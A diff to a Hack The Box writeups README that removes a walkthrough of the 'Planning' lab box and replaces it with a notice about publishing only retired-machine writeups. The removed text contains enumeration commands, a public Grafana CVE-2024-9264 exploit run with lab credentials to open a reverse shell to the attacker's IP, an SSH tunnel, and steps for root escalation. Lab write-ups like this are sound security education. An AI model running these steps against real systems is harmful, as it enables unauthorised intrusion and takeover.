@@ -1,101 +1,13 @@
-#  HackTheBox: Planning - Writeup
-This easy-difficulty box involves discovering a vulnerable Grafana v11.0.0 subdomain and exploiting CVE-2024-9264 for initial access. After pivoting to the user enzo, an internal cronjob web app running as root is accessed via SSH tunneling. Abusing this app allows privilege escalation to root. The box combines web enumeration, real-world CVE usage, and creative privesc via scheduled tasks.
+## 📘 HTB Writeups Policy
 
+Welcome to my Hack The Box (HTB) writeup repository!
 
-##  Enumeration
+🛡️ **Important Notice**  
+In accordance with [HTB's disclosure policy](https://www.hackthebox.com/writeups), **writeups are only published for retired machines** to avoid spoiling active challenges or violating platform rules.
 
-### Nmap Scan
+🧠 Each writeup will be released **after the machine is officially retired** by Hack The Box.  
+🔐 Active machine solutions will never be posted or shared publicly.
 
-We begin with an `nmap` scan, which reveals two open ports:  
-- **22** (SSH)  
-- **80** (nginx web server)
+💬 If you're interested in a particular writeup that hasn’t been published yet, feel free to reach out — I’ll let you know once it’s safe and available.
 
-```bash
-nmap -sCV -T4 10.10.11.68
-```
-### Directory Enumeration
-![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Planning/Screenshots/image002.png)
-
-Upon enumeration of the directories on the web server, nothing of significance comes up.
-```bash
-gobuster dir -u http://planning.htb/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 50 --timeout 20s -x html,php
-```
-![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Planning/Screenshots/image004.png)
-
-### Subdomain Enumeration
-So, ffuf is used to look for any subdomains the web page might have, and it comes up with Grafana.planning.htb.
-```bash
-ffuf -w ../../seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://planning.htb -H "Host:FUZZ.planning.htb" -fc 301 -t 100
-```
-![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Planning/Screenshots/image005.png)
- 
-After discovering the subdomain grafana, it is appended to the hosts file, so we’re able to access it. 
-![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Planning/Screenshots/image007.png)
-
-## Exploitation
-Going into the webpage, we see it runs V11.0.0 which is vulnerable to RCE (CVE-2024-9264).
-![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Planning/Screenshots/image009.png)
-
-![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Planning/Screenshots/image011.png)
- 
-We then use an exploit found on github by z3k0sec, which allows us to RCE into the system using reverse shell.
-
-```bash
-Git clone https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit
-```
-
-![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Planning/Screenshots/image013.png)
-
-The script is then executed and a listener is set up.
-
-Note: To run the script, you will have to install the requests module through pip (pip install requests), in a python virtual environment.
-```bash
-python3 poc.py --url http://grafana.planning.htb/ --username admin --password 0D5oT70Fq13EvB5r --reverse-ip 10.10.14.x --reverse-port 1234
-```
-
-![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Planning/Screenshots/image015.png)
-
-## Post-Exploitation
-  
-Upon gaining access to the system, we are root but this user doesn’t contain either of the flags, so linPEAS is ran to look for any sensitive information.
-
-![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Planning/Screenshots/image017.png)
-
-### linPEAS Enumeration (root User)
-
-Upon running linPEAS, the password for the user ‘enzo’ is obtained.
-
-![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Planning/Screenshots/image019.png)
-
-Able to SSH into enzo, the user flag is obtained.
-
-![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Planning/Screenshots/image021.png)
-
-### linPEAS Enumeration (enzo User)
-
-linPEAS is ran again, this time in enzo’s user to look for any sensitive files. After which we see some database files.
-
-![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Planning/Screenshots/image023.png)
-
-Exploring the crontab.db, we find a password for the root user. Looking for active connections, we see a webserver being hosted at port 8000.
-
-![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Planning/Screenshots/image025.png)
-
-### SSH Tunneling
-
-Using SSH tunnelling we host it in our own machine, at port 8001. It requires a username and password, available from the crontab.db database.
-```bash
-ssh -L 8001:localhost:8000 enzo@10.10.11.68
-```
-
-![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Planning/Screenshots/image027.png)
-
-## Privelege Escalation
-
-The website functions as a cronjobs simulator, executing tasks at a certain time as root. From here we can privilege escalate the enzo’s user as sudo, gaining root privileges.
-
-![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Planning/Screenshots/image029.png)
-
-After obtaining privileges we are able to obtain the root flag.
-
-![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Planning/Screenshots/image031.png)
+Thanks for understanding, and happy hacking! 👾
